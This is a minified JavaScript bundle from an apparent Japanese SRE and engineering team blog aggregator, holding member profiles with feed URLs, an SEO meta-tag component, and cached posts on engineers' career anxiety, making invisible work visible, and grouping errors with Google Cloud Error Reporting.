"use strict";(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[736],{1202:(e,t,o)=>{o.d(t,{o:()=>a});let a=[{id:"yteraoka",name:"yteraoka",role:"SRE",bio:"ojisan",avatarSrc:"/avatars/yteraoka.jpeg",sources:["https://blog.1q77.com/index.xml","https://qiita.com/yteraoka/feed","https://medium.com/feed/@yteraoka","https://zenn.dev/yteraoka/feed"],includeUrlRegex:"",twitterUsername:"yteraoka",githubUsername:"yteraoka",websiteUrl:"https://blog.1q77.com/"},{id:"tozastation",name:"tozastation",role:"SRE",bio:"tarako_chan",avatarSrc:"/avatars/tozastation.jpg",sources:["https://qiita.com/tozastation/feed","https://tozastation.hashnode.dev/rss.xml","https://zenn.dev/tozastation/feed"],includeUrlRegex:"",twitterUsername:"tozastation",githubUsername:"tozastation",websiteUrl:"https://github.com/tozastation"},{id:"kyohmizu",name:"kyohmizu",role:"SRE",bio:"mizumoto",avatarSrc:"/avatars/kyohmizu.png",sources:["https://kyohmizu.hatenablog.com/feed","https://qiita.com/kyohmizu/feed","https://speakerdeck.com/kyohmizu.rss"],includeUrlRegex:"",twitterUsername:"kyohmizu",githubUsername:"kyohmizu",websiteUrl:"https://profile.kyohmizu.com/"},{id:"nwiizo",name:"nwiizo",role:"Software Developer",bio:"The Passionate Programmer",avatarSrc:"/avatars/nwiizo.jpeg",sources:["https://syu-m-5151.hatenablog.com/feed","https://zenn.dev/nwiizo/feed","https://speakerdeck.com/nwiizo.rss"],includeUrlRegex:"",twitterUsername:"nwiizo",githubUsername:"nwiizo",websiteUrl:"https://nwiizo.github.io/"},{id:"skikkh",name:"skikkh",role:"SRE",bio:"skikkh",avatarSrc:"/avatars/skikkh.jpeg",sources:["https://qiita.com/skikkh/feed"],includeUrlRegex:"",twitterUsername:"skikkh",githubUsername:"skikkh",websiteUrl:""},{id:"toshikish",name:"toshikish",role:"SRE",bio:"Toshiki Shimomura",avatarSrc:"/avatars/toshikish.png",sources:["https://toshikish.hateblo.jp/feed","https://zenn.dev/toshikish/feed","https://qiita.com/toshikish/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"toshikish",websiteUrl:""},{id:"Sreake",name:"Sreake",role:"",bio:"This Is The Sreake Section Blog.",avatarSrc:"/avatars/sreake.png",sources:["https://sreake.com/feed/"],includeUrlRegex:"blog",excludeUrlRegex:"event",twitterUsername:"SreakeJ",githubUsername:"",websiteUrl:"https://sreake.com"},{id:"Reckoner",name:"Reckoner",role:"",bio:"This Is The Reckoner Section Blog.",avatarSrc:"/avatars/reckoner.png",sources:[],includeUrlRegex:"blog",excludeUrlRegex:"event",twitterUsername:"reckoner_japan",githubUsername:"",websiteUrl:"https://reckoner.io/"},{id:"tez",name:"Takuya Tezuka",role:"JB",bio:"tez",avatarSrc:"/avatars/tezuka.jpeg",sources:["https://qiita.com/TT_Private/feed","https://speakerdeck.com/takuyatezuka.rss"],includeUrlRegex:"qiita.com/TT_Private",twitterUsername:"tt0603",githubUsername:"taku-tez",websiteUrl:"https://www.wantedly.com/id/takuya_tezuka"},{id:"sosan01",name:"Soichiro Tsuchida",role:"SRE",bio:"sosan",avatarSrc:"/avatars/sosan01.png",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"sosan01",websiteUrl:""},{id:"atsuya0",name:"Atsuya Tsukada",role:"SRE",bio:"human",avatarSrc:"/avatars/atsuya0.jpg",sources:["https://zenn.dev/tayusa/feed","https://qiita.com/atsuya0/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"atsuya0",websiteUrl:"https://github.com/atsuya0"},{id:"masasuzu",name:"SUZUKI, Masashi",role:"SRE",bio:"yasetai",avatarSrc:"/avatars/masasuzu.png",sources:["https://blog.masasuzu.net/feed","https://speakerdeck.com/masasuzu.rss"],includeUrlRegex:"",twitterUsername:"masasuz",githubUsername:"masasuzu",websiteUrl:"https://masasuzu.net"},{id:"kiyos",name:"Kyohei Saito",role:"SRE",bio:"haraheri",avatarSrc:"/avatars/kiyos.jpeg",sources:["https://zenn.dev/kyohei_saito/feed"],includeUrlRegex:"",twitterUsername:"kiyo_12_07",githubUsername:"kiyo-s",websiteUrl:""},{id:"mos914",name:"Yu Kaneko",role:"SRE",bio:"koke",avatarSrc:"/avatars/mos914.png",sources:["https://qiita.com/dirtymosschan/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"mos914",websiteUrl:""},{id:"unvavo",name:"nobu",role:"SRE",bio:"nobu",avatarSrc:"/avatars/nobu.png",sources:[],includeUrlRegex:"",twitterUsername:"unvavo",githubUsername:"unvavo",websiteUrl:""},{id:"hiroki-hasegawa",name:"長谷川 広樹",role:"なんらかのエンジニア",bio:"顔画像は著作権フリーですのでどうぞ",avatarSrc:"/avatars/hirokihasegawa.png",sources:["https://hiroki-hasegawa.hatenablog.jp/feed","https://speakerdeck.com/hiroki_hasegawa.rss"],includeUrlRegex:"",twitterUsername:"Hiroki__IT",githubUsername:"hiroki-it",websiteUrl:"https://hiroki-it.github.io/tech-notebook/"},{id:"kaisato",name:"Kai Sato",role:"SRE",bio:"domo",avatarSrc:"/avatars/kaisato.png",sources:[],includeUrlRegex:"",twitterUsername:"KAI21441756",githubUsername:"kaitexio",websiteUrl:""},{id:"ysakurai",name:"Yusuke Sakurai",role:"SRE",bio:"ysakurai",avatarSrc:"/avatars/ysakurai.jpg",sources:["https://qiita.com/ys1/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"saku3",websiteUrl:""},{id:"tayakun",name:"Soichiro Taya",role:"SRE",bio:"tayakun",avatarSrc:"/avatars/tayakun.png",sources:["https://qiita.com/tayakun/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"tayatamn",websiteUrl:""},{id:"SatohJohn",name:"SatohJohn",role:"Software Developer",bio:"SatohJohn",avatarSrc:"/avatars/satohjohn.png",sources:["https://qiita.com/satohjohn/feed","https://zenn.dev/satohjohn/feed"],includeUrlRegex:"",twitterUsername:"satohjohn",githubUsername:"satohjohn",websiteUrl:""},{id:"bayobayo0324",name:"bayobayo0324",role:"back/front/app Engineer",bio:"osake daisuki",avatarSrc:"/avatars/bayobayo0324.jpeg",sources:["https://qiita.com/bayobayo0324/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"bayobayo0324",websiteUrl:""},{id:"myamamoto",name:"myamamoto",role:"SRE",bio:"human",avatarSrc:"/avatars/myamamoto.jpeg",sources:["https://zenn.dev/ureuzy/feed"],includeUrlRegex:"",twitterUsername:"ureuzy",githubUsername:"ureuzy",websiteUrl:""},{id:"seno",name:"seno",role:"DBRE",bio:"seno",avatarSrc:"/avatars/seno.jpeg",sources:["https://zenn.dev/nedoko_dok0dko/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"senohirona",websiteUrl:""},{id:"sakama",name:"sakama",role:"SRE",bio:"homo sapiens",avatarSrc:"/avatars/sakama.jpeg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"junichiro-sakama",websiteUrl:""},{id:"stakamura",name:"Shohei Takamura",role:"SRE",bio:"SRE",avatarSrc:"/avatars/stakamura.jpg",sources:["https://zenn.dev/hakushou41/feed"],includeUrlRegex:"",twitterUsername:"hakushou41",githubUsername:"hakushou41",websiteUrl:""},{id:"toVersus",name:"Tsubasa Nagasawa",role:"SRE",bio:"lazy programmer",avatarSrc:"/avatars/toVersus.png",sources:["https://qiita.com/toVersus/feed","https://zenn.dev/toversus/feed"],includeUrlRegex:"",twitterUsername:"toversus26",githubUsername:"toVersus",websiteUrl:""},{id:"raba-jp",name:"Hiroki Sakuraba",role:"Software Developer",bio:"meow",avatarSrc:"/avatars/raba-jp.jpg",sources:["https://zenn.dev/raba_jp/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"raba-jp",websiteUrl:""},{id:"ixsakra",name:"Ryosuke Sakurai",role:"SRE",bio:"ganbarumasu 'w'",avatarSrc:"/avatars/ixsakra.jpg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:""},{id:"nnaka2992",name:"NAKADATE Naoki",role:"DBRE",bio:"what on the earth is Database?",avatarSrc:"/avatars/nnaka2992.jpg",sources:["https://nnaka2992.hatenablog.com/feed","https://zenn.dev/nnaka2992/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:"https://nnaka2992.hatenablog.com/"},{id:"satoken",name:"satoken",role:"SRE",bio:"",avatarSrc:"/avatars/satoken.jpg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:""},{id:"bells17",name:"bells17",role:"Software Engineer",bio:"Software Engineer",avatarSrc:"/avatars/bells17.jpeg",sources:["https://zenn.dev/bells17/feed","https://medium.com/feed/@bells17","https://speakerdeck.com/bells17.rss"],includeUrlRegex:"",twitterUsername:"bells17_",githubUsername:"bells17",websiteUrl:"https://bells17.io/"},{id:"hide-1",name:"Shuichi Inoue",role:"long-term internship student",bio:"I want to become a strong engineer :)",avatarSrc:"/avatars/hide-1.jpg",sources:["https://sreake.com/blog/config-connectortest/feed","https://sreake.com/blog/kubernetes-operation-with-chatgpt/feed","https://sreake.com/blog/kubernetes-operation-with-chatgpt4/feed","https://sreake.com/blog/chatgpt-slack-integration/feed"],includeUrlRegex:"",twitterUsername:"19MU50",githubUsername:"hide-1",websiteUrl:""},{id:"yuu0w0yuu",name:"Yutaro Shirayama",role:"SRE",bio:"( ˘ω˘ )",avatarSrc:"/avatars/shirayama.jpg",sources:["https://zenn.dev/yuu0w0yuu/feed"],includeUrlRegex:"",twitterUsername:"yuu0w0yuu",githubUsername:"yuu0w0yuu",websiteUrl:""},{id:"gawingowin",name:"Araki Shogo",role:"long-term internship student",bio:"born 2 be engineer",avatarSrc:"/avatars/araki-icon.jpg",sources:[],includeUrlRegex:"",twitterUsername:"GawinGowin",githubUsername:"GawinGowin",websiteUrl:""},{id:"nomadblacky",name:"Takumi Kadowaki",role:"Software Engineer @ Reckoner",bio:"Scala / Observability",avatarSrc:"/avatars/nomadblacky.jpg",sources:["https://zenn.dev/nomadblacky/feed","https://speakerdeck.com/nomadblacky.rss"],includeUrlRegex:"",twitterUsername:"nomadblacky",githubUsername:"NomadBlacky",websiteUrl:""},{id:"kobuchi",name:"Shu Kobuchi",role:"Software Developer",bio:"mammalian",avatarSrc:"/avatars/kobuchi.jpeg",sources:["https://shu-kob.hateblo.jp/feed","https://speakerdeck.com/shukob.rss"],includeUrlRegex:"",twitterUsername:"shu_kob",githubUsername:"shu-kob",websiteUrl:""},{id:"kojake_300",name:"Yuki Iwasaki",role:"SRE",bio:"Splatoon",avatarSrc:"/avatars/yuki_iwasaki.png",sources:["https://qiita.com/kojake_300/feed","https://zenn.dev/kojake_300/feed","https://speakerdeck.com/kojake_300.rss"],includeUrlRegex:"",twitterUsername:"kojake_300",githubUsername:"",websiteUrl:""},{id:"kurita",name:"Kurita Keigo",role:"long-term internship student",bio:"I want to enginner the reliablity of the site",avatarSrc:"/avatars/kurita.jpg",sources:["https://kechigon.hatenablog.com/feed"],includeUrlRegex:"",twitterUsername:"kechigongon",githubUsername:"kechigon",websiteUrl:"https://www.wantedly.com/id/keigo_kurita_e"},{id:"masaru-komiyama",name:"masaru-komiyama",role:"SRE",bio:"SRE",avatarSrc:"/avatars/komiyama5380.jpg",sources:["https://qiita.com/masaru-komiyama/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:"https://qiita.com/masaru-komiyama/"},{id:"moz-sec",name:"Kobayashi Shun",role:"long-term internship student",bio:"I am a graduate student in Kyoto",avatarSrc:"/avatars/kobayashi.png",sources:["https://moz-security.hatenablog.com/feed","https://zenn.dev/moz_sec/feed","https://speakerdeck.com/moz_sec_.rss"],includeUrlRegex:"",twitterUsername:"moz_sec_",githubUsername:"moz-sec",websiteUrl:"https://moz-sec.com/"},{id:"yyamada",name:"Yunosuke Yamada",avatarSrc:"/avatars/yyamada.jpg",role:"Full Stack Engineer",bio:"筋トレ / LLM / Webアプリケーション",sources:["https://zenn.dev/kimitsu/feed","https://speakerdeck.com/yunosukey.rss"],githubUsername:"YunosukeY",twitterUsername:"east_k1mitsu",websiteUrl:"https://linktr.ee/kimitsu"},{id:"k-nagase",name:"Kohei Nagase",avatarSrc:"/avatars/koheinagase.jpg",role:"SRE",bio:"YANIKASU",sources:["https://zenn.dev/k_nagase/feed"],githubUsername:"k-ngs",twitterUsername:"koh_naga",websiteUrl:""},{id:"iota",name:"Itaru Ota",avatarSrc:"/avatars/iota.jpg",role:"Full Stack Engineer",bio:"A.R.E.",sources:["https://zenn.dev/iorandd/feed","https://speakerdeck.com/ota1022.rss"],githubUsername:"Ota1022",twitterUsername:"iorandd",websiteUrl:"https://ota1022.github.io/"},{id:"kamono",name:"Makoto Kamono",avatarSrc:"/avatars/kamono.jpg",role:"SRE",bio:"kamo dayo~",sources:["https://zenn.dev/kamos/feed"],githubUsername:"Mkamono",twitterUsername:"duckend_pg",websiteUrl:""},{id:"akagawa",name:"Daisuke Akagawa",avatarSrc:"/avatars/akagawa.png",role:"Full Stack Engineer",bio:"Akasan",sources:["https://zenn.dev/akasan/feed","https://medium.com/feed/@daisuke1024akagawa"],githubUsername:"Akasan",twitterUsername:"",websiteUrl:""},{id:"kugimiya",name:"Daichi Kugimiya",avatarSrc:"/avatars/kugimiya.jpeg",role:"Full Stack Engineer",bio:"Kugimiya",sources:["https://zenn.dev/meziron/feed"],githubUsername:"daikugimiya0715",twitterUsername:"abimaruXD",websiteUrl:""},{id:"matsuura",name:"Yushin Matsuura",avatarSrc:"/avatars/matsuura.png",role:"Full Stack Engineer",bio:"Matsuura",sources:["https://qiita.com/m_pig/feed"],githubUsername:"you-matsuura",twitterUsername:"yuu_matsu_yuu",websiteUrl:"https://qiita.com/m_pig"},{id:"silasolla",name:"Masaki Haga",avatarSrc:"/avatars/silasolla.png",role:"Full Stack Engineer",bio:"Trust, but verify.",sources:["https://zenn.dev/silasolla/feed","https://silasol.la/rss/tech.xml"],githubUsername:"silasolla",twitterUsername:"silasolla",websiteUrl:"https://silasol.la"},{id:"amine",name:"Amine Ilidrissi",avatarSrc:"/avatars/amine.jpeg",role:"Full Stack Application Engineer",bio:"Writing about Laravel, Astro, and whatever happens on the job",sources:["https://qiita.com/aminevg/feed","https://speakerdeck.com/aminevg.rss"],githubUsername:"aminevg",twitterUsername:"realaminevg",websiteUrl:""},{id:"reito",name:"Reito Koike",role:"SRE",bio:"curiosity-driven SRE",avatarSrc:"/avatars/reito.png",sources:["https://zenn.dev/r4ynode/feed","https://qiita.com/r4ynode/feed"],includeUrlRegex:"",twitterUsername:"r4ynode",githubUsername:"r4ynode",websiteUrl:""},{id:"riiim",name:"riiim",role:"Engineer",bio:"Engineer",avatarSrc:"/avatars/riiim.png",sources:["http://rowicy.com/RiiiM/rss.xml"],includeUrlRegex:"",twitterUsername:"riiim400th",githubUsername:"riiim400th",websiteUrl:"https://www.rowicy.com/blog/"},{id:"sraku",name:"Sota Nakano",role:"SRE",bio:"sraku",avatarSrc:"/avatars/sraku.jpg",sources:["https://zenn.dev/sraku/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"sraku2159",websiteUrl:""},{id:"takehiro1111",name:"takehiro1111",role:"Engineer",bio:"takehiro1111",avatarSrc:"/avatars/takehiro1111.jpg",sources:["https://zenn.dev/takehiro1111/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"takehiro1111",websiteUrl:""},{id:"ayibote",name:"ayibote",role:"Infrastructure Engineer",bio:"",avatarSrc:"/avatars/ayibote.jpg",sources:["https://dev.mix64.com/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"mix64",websiteUrl:""},{id:"yutaf11",name:"Yuta Fujii",role:"Engineer",bio:"(  ˙-˙  )",avatarSrc:"/avatars/yfujii.png",sources:["https://qiita.com/yutaf11/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"pogepoge9",websiteUrl:""}].sort((e,t)=>e.id<t.id?-1:1)},4003:(e,t,o)=>{o.d(t,{t:()=>s});var a=o(7876),i=o(7328),r=o.n(i),n=o(9348);let s=e=>{let{path:t,title:o,description:i,ogImageUrl:s,noindex:c,removeSiteNameFromTitle:l}=e,u="".concat(n.$.siteRoot).concat(t||"");return(0,a.jsxs)(r(),{children:[(0,a.jsx)("title",{children:l?o:"".concat(o," | ").concat(n.$.siteMeta.title)}),(0,a.jsx)("meta",{property:"og:title",content:o}),(0,a.jsx)("meta",{property:"og:url",content:u}),(0,a.jsx)("meta",{name:"twitter:card",content:"summary_large_image"}),(0,a.jsx)("meta",{property:"og:site",content:n.$.siteMeta.title}),(0,a.jsx)("meta",{property:"og:image",content:s||"".concat(n.$.siteRoot,"/og.png")}),!!i&&(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)("meta",{name:"description",content:i}),(0,a.jsx)("meta",{property:"og:description",content:i})]}),t&&(0,a.jsx)("link",{rel:"canonical",href:u}),c&&(0,a.jsx)("meta",{name:"robots",content:"noindex"})]})}},6067:e=>{e.exports=JSON.parse('[{"title":"「もう終わりだ」と判断するには、早すぎる","link":"https://syu-m-5151.hatenablog.com/entry/2026/01/13/102207","contentSnippet":"はじめに先週、学生向けのワークショップでチューターのようなことをしていた。休み時間に一人の学生がこう喋りかけてきた。「このままだと、結構ヤバいですよね」「なにが？」と聞き返す前に、学生は続けた。技術力が伸びていない気がする。周りはもう◯◯を触っているしインターンにも参加している。自分はまだ✗✗で手一杯。この選択、取り返しつかないんじゃないか。私は黙って聞いていた。正直に言えば、20代の自分が言いそうなことばかりだったからだ。この学生だけではない。勉強会で声をかけてくる若手、懇親会で相談してくる後輩、DMで質問してくるフォロワー。彼らの悩みには共通点がある。「自分は遅れている」「この選択は間違いだったかもしれない」「周りはもっと先に行っている」。能力の問題ではなく、比較の問題だ。そして比較の基準は、自分で作ったものではない。その感覚自体は、とても真面目だし誠実だと思う。でも同時に、「ヤバい」という言葉が、あまりにも早く、あまりにも重く使われすぎているとも感じる。頭の中にある「正しいキャリア」若手が苦しむのは、入社前から「3年目でリーダー、5年目でシニア」という成長曲線のテンプレートが頭にあるからだ。このテンプレートはどこから来るのか。転職サイトの「年収アップ事例」、Qiitaの「◯年目の振り返り」記事、Twitterで流れてくる「同期はもう◯◯をやっている」という投稿。経験する前に、「正解」が決まっている。結果として起きるのは、「まだ経験していない失敗」によって、今の自分が否定される状態だ。本来なら、やってみてから悩めばいいはずのことを、\\"将来の評価\\"で今の自分を裁いてしまっている。ここで「テンプレートがあることで救われる人もいる」という反論があるかもしれない。確かにそうだ。指針がなければ迷う。しかし問題は、そのテンプレートが「誰のために作られたか」だ。誰がその不安で得をしているかここで一度、立ち止まって考えてみてほしい。「◯年目でこのスキルがないと詰む」という記事を書いているのは誰か。転職サイトは転職してもらわないと儲からないし、教材は買ってもらわないと意味がない。だから「今のままで大丈夫」とは言わない。「今のままではマズい」と言った方が、人は動く。その焦り、あなたのせいじゃない。誰かが焦らせて、得をしている場合もある。「この不安を煽っている情報で、誰が得をするか？」という問いを持っておくと、少し楽になる。後講釈を設計図にしてはいけない検索すれば、「◯歳でこのスキルがないと詰む」「この技術はもうオワコン」「このルートを外すと市場価値が下がる」という\\"結論\\"がすぐに出てくる。でも、それらの多くは後講釈だ。結果が出た人の人生を、あとから綺麗に整理したものにすぎない。「Rustを早くから学んでいたから成功した」という話は、Rustが流行った後だから言えることだ。当時は「なんでそんなマイナー言語やってるの」と言われていたかもしれない。問題は、それを未来の設計図として信じてしまうことだ。設計図があると、人は安心する。でも同時に、その線から外れることを極端に恐れるようになる。動けないのは、能力がないからじゃない。先を読みすぎているからだ。「じゃあ情報を見なければいいのか」という反論があるかもしれない。そうではない。問題は情報の量ではなく、情報との距離感だ。「参考にする」と「信じる」は違う。他人のキャリアは参考にはなるが、自分の設計図にはならない。「成長していない」の正体よく聞く言葉に、「自分、成長してない気がします」がある。でも冷静に見ると、そう感じている人の多くは、知らなかった世界を知り、自分の未熟さを自覚し、他人の強さが見えるようになった状態にいる。それはむしろ、成長のど真ん中だ。私自身、20代の頃は「成長している」と感じたことがほとんどなかった。いつも足りない、遅れている、という感覚だった。でも振り返ると、その時期に一番伸びていた。「できている」と思い込んでいた時期より、はるかに。成長していない人は、自分の課題が見えていない。不安になるのは、視野が広がった証拠でもある。1年前の自分のコードを見て恥ずかしいと思えるなら、それが何よりの証拠だ。後から意味をつける少なくとも私のキャリアはそうだった。後から振り返れば一本道に見えるかもしれないが、渦中では迷走していた。私のキャリアを例にする。プログラマーから始まり、ネットワークエンジニア、インフラエンジニア、ミドルウェア開発をするバックエンドエンジニアを経て、今はソフトウェアエンジニアになった。渦中ではただの迷走だった。「軸がない」「専門性がない」と焦っていた時期もある。しかし今、この経路を「レイヤーを横断して理解できる強み」と意味づけている。ネットワークを知っているからインフラの設計ができる。インフラを知っているからミドルウェアの選定ができる。全部触ったから、どこがボトルネックになるか分かる。ある障害対応のとき、アプリ側の知識とインフラ側の知識が両方あったおかげで、原因の切り分けが早くできた。その瞬間、「あの経験、無駄じゃなかった」と思った。「後から意味がつく」のではなく、「後から意味をつける」のだ。この意味づけは、誰かがしてくれたわけではない。自分で、後から、つけたのだ。当時の私に「それは迷走ではなく、レイヤー横断の修行だ」と言っても信じなかっただろう。でも、後から意味をつける権利は、自分にしかない。エンジニアのキャリアは、本来もっと雑で、揺れていて、後から意味がつくものだ。技術は変わる。5年前の「正解」が今は使われていないこともある。その変化の中で一直線を引けるはずがない。一直線で語れる人は、後から線を引き直しているか、運が良かっただけだ。雑に学べる余裕若い頃の自分を振り返ると、「役に立つかどうか」をあまり考えずに触っていた時期がある。仕事に直結しないけど面白そうだから触る。流行っていないけど気になるから読む。そういう雑な寄り道が、後から効いてくることがある。効率的なキャリア形成を意識しすぎると、この余裕がなくなる。「これを学んで何になるのか」「市場価値につながるのか」と考え始めると、興味の赴くままに手を動かすことが難しくなる。でも、興味のないことを義務感で学ぶのは、正直つらい。私がネットワークやインフラを触っていた頃、別にキャリア戦略があったわけではない。そこに仕事があったから触っていた。面白かったから深掘りした。当時は「これが何になるのか」なんて分からなかった。でも、その雑な経験が今の自分を作っている。若手には、もう少し自由に学んでほしいと思う。効率を求めすぎず、「なんか面白そう」で手を出していい。変なものを触っていい。それが後から意味を持つかどうかは、今は分からない。でも、分からないまま手を動かせることが、若さの特権だと思う。矛盾を抱えたまま書いているここまで書いてきて、自分の中にある矛盾に気づいている。私はマッチョイズム——「努力すれば報われる」「できないのは頑張りが足りない」という考え方——が嫌いだ。構造的な問題を個人の努力不足に還元するのは不誠実だと思う。「俺はやれたんだからお前もやれるはずだ」という言葉には、想像力の欠如を感じる。しかし同時に、正直に言えば、「おい、もうちょっと頑張ってくれよ」と思う瞬間がある。自分には厳しくしているのに、他人がのほほんとしているのを見ると、つい口を出したくなる。この矛盾に自分でも気づいている。整理してみると、私が嫌悪しているのは「努力」そのものではない。努力を道徳化し、人の価値と結びつけ、頑張れない人を断罪する態度だ。一方で、明らかに本人にとっても損になる怠惰には「おい、」と思う。周囲に負荷をかける無責任さにも、やはり同じことを思う。この記事で「焦らなくていい」と書いているのは、「頑張らなくていい」という意味ではない。不安を煽る構造に踊らされて、自分を責め続ける必要はない、という意味だ。構造を理解した上で、自分のペースで手を動かせばいい。努力できる環境を整えることには責任を持つ。でも努力するかどうかは本人が決める。ただし、その選択の結果が他者に不当な負荷をかけるなら、それは指摘する。これは「甘やかし」でも「突き放し」でもない、第三の態度だと思っている。おわりにここまで書いてきて、偉そうだな、と自分でも思う。30代のエンジニアが、20代に向かって「焦るな」と言う。「それは成功した人の余裕だろう」という反論も聞こえる気がする。確かにそうかもしれない。でも、私がこれを書いているのは、過去の自分に向かって話しているからだ。20代の私は、焦っていた。周りと比べて、正解ルートを探して、外れることを恐れていた。その焦りが和らいだのは、能力がついたからではなく、構造を理解したからだ。不安を煽る側の意図が見えるようになったからだ。先週のワークショップで話した学生は、最終日には手を動かしていた。「ヤバい」と言いながらも、手は動いていた。焦りを感じている自分を責めないでほしい。焦りは、真剣に考えている証拠だ。自分は遅れているのではなく、情報が多すぎる時代で、ちゃんと考えているだけかもしれない。「この不安で誰が得をするか」を問うてほしい。あなたのキャリアのために作られたテンプレートは、あなた自身しか作れない。「お互い、何とかやっていこう」と言い合える仲間がいるなら、それだけで続ける理由になる。今日も少しでも手を動かしているなら、それで十分だ。少なくとも、「もう終わりだ」と判断するには、早すぎる。ちなみに、この記事を書くきっかけになったワークショップは以下だ。学生でKubernetesやDockerに興味がある方はぜひ参加してほしい。hrmos.co","isoDate":"2026-01-13T01:22:07.000Z","dateMiliSeconds":1768267327000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Error ReportingとCloud Runでアプリエラーをいい感じにグループ化してGitHubイシューにする","link":"https://zenn.dev/kimitsu/articles/report-error-to-github","contentSnippet":"Error Reporting とは皆さん、Google Cloud の Error Reporting はご存知でしょうか。あまり知られていないのではないかなと思っています。アプリからは日々エラーが出ておりエンジニアはそれに対応する必要がありますが、エラーというものは同じ原因で複数回出るものです。ログを眺めていて同じようなエラーがたくさん並んでいてもあまり情報は増えません。Error Reporting はアプリケーションのエラーログを収集し、同じ原因のエラーをグループ化してくれるサービスです。[1]例えば以下の例では同じエラーが 3 回出ていますが、Error Rep...","isoDate":"2026-01-12T02:52:23.000Z","dateMiliSeconds":1768186343000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"おい、辞めないなら頑張れ","link":"https://syu-m-5151.hatenablog.com/entry/2026/01/12/003013","contentSnippet":"はじめに先週、「おい、辞めるな」という記事を書きました。syu-m-5151.hatenablog.com思った以上に反響がありました。何人かから連絡をもらいました。辞めないことにしました、考えるきっかけになりました、と。ありがたかったです。嬉しかった、と言っていいです。たぶん。ただ、何か落ち着きませんでした。辞めないと決めた。それは分かった。で、その次は。辞めないと決めただけで、何かが変わるわけではありません。私がそうだったからです。辞めないと決めた後も、何も変わりませんでした。評価は上がらない。漠然としたモヤモヤは消えない。夜遅くまでコードを書いた。勉強会に参加した。資格を取った。ブログを書いた。技術力を上げれば認められる。そう信じていました。評価は上がりませんでした。振り返ると、私は頑張り方を間違えていたのです。もっと正確に言えば、評価の構造を理解していませんでした。良い仕事をすれば評価される。そう思っていました。でも、評価者には評価者の論理があります。組織には組織の論理があります。その構造を理解せずに、がむしゃらに頑張っても、報われません。「おい、辞めるな」の最後に、「選んだ道を、正解にしていく過程があるだけだ」と書きました。辞めないと決めた。その選択を正解にするために、何をすればいいのか。この文章は、それを書くために開きました。ただ、書きながらも思います。これが誰かの役に立つのかは、分かりません。分からないまま、書いています。先に断っておきます。この記事は、まだ頑張れる余力がある人に向けて書いています。すでに消耗している人、頑張る気力すらない人には、この記事は届かないだろう。それについては、最後に書きます。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。見えない努力まず、頑張り方を間違えている人が多いです。私もそうでした。インフラのトラブルを未然に防いだことがあります。監視アラートの傾向を見て、「これ、来週やばいことになる」と気づきました。週末に対応して、障害を防ぎました。本番で落ちていたら大騒ぎでした。サービスが止まれば、ビジネスに直接影響が出ます。ユーザーからのクレームが殺到します。深夜に全員が叩き起こされます。そういう未来を、私は未然に防ぎました。でも、月曜日、何事もなかったように仕事が始まりました。誰も何も言いませんでした。障害が起きなかったという「非イベント」は、誰の記憶にも残りません。チームの技術的負債を黙々と返済したことがあります。3ヶ月かけて、複雑なモジュールをリファクタリングしました。スパゲッティコードを解きほぐし、テストカバレッジを上げ、ドキュメントを整備しました。誰かがこの負債を返さなければ、いずれチーム全体が身動きを取れなくなります。そう思って、地道に片付けました。でも、リリース直前に「いつの間にかキレイになってた」と言われただけでした。3ヶ月の努力が、「いつの間にか」で片付けられました。いつの間にか、俺も消えていました。私は「良い仕事をしていれば、いつか評価される」と思っていました。黙々と価値を出していれば、誰かが見ている。実力で認められる。そう信じていました。甘かったです。現実はこうです。見えない仕事は、存在しないのと同じ。どんなに素晴らしい設計をしても、それを言語化して共有しなければ、誰も知りません。どんなに難しいバグを直しても、「大変だった」と伝えなければ、簡単な修正だと思われます。障害を未然に防いでも、障害が起きなかったという「非イベント」は記憶に残りません。これは不公平だと思うだろう。私もそう思いました。私は2年間嘆いていました。居酒屋で同僚と「この会社の評価制度はおかしい」と言い合ったこともあります。「なんで俺の仕事が評価されないんだ」と愚痴りました。言うたびに少し楽になりました。だけど、翌日も同じ状況が続きました。嘆きは鎮痛剤です。痛みを一時的に和らげますが、原因は治りません。この構造を理解した上で、どう振る舞うか。 